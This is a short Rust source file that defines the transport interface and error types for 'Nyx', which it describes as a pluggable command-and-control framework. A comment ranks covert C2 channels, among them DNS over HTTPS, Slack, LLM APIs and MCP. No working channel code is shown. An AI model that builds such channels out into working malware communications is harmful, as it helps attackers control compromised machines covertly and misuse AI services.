// Nyx Transport Abstraction Layer — pluggable C2 channel framework.
//
// Channel priorities (0 = highest): HTTPS > DoH DNS > Slack API > LLM API > MCP > SMB

// ---- Error type -----------------------------------------------------------

#[derive(Debug)]
pub enum TransportError {
    /// Channel is dead — no recovery possible.
    Dead(&'static str),
    /// Transient failure — retry may succeed.
    Transient(&'static str),
    /// Timeout waiting for response.
    Timeout,
    /// Payload too large for this channel.
    PayloadTooLarge(usize),
}

// ---- Transport trait ------------------------------------------------------

/// Pluggable C2 transport channel.
///
/// Each implementation handles a specific protocol (HTTPS, DNS, Slack API, etc.).
pub trait Transport {
    /// Send a frame. Returns Ok(()) if delivered, Err on failure.
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError>;

    /// Receive next frame. Blocks up to `timeout_ms`.
    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError>;

    /// Check channel health. Returns latency in ms, or None if dead.
    fn health_check(&self) -> Option<u64>;

    /// Channel identifier for logging.
    fn name(&self) -> &'static str;

    /// Maximum payload size this channel supports in a single frame.
    fn max_frame_size(&self) -> usize {
        1024 * 1024
    } // default 1MB

    /// Whether this channel requires connectivity check before use.
    fn requires_probe(&self) -> bool {
        true
    }

    /// One-time initialization (called once when channel is first activated).
    fn init(&mut self) -> Result<(), TransportError> {
        Ok(())
    }
}
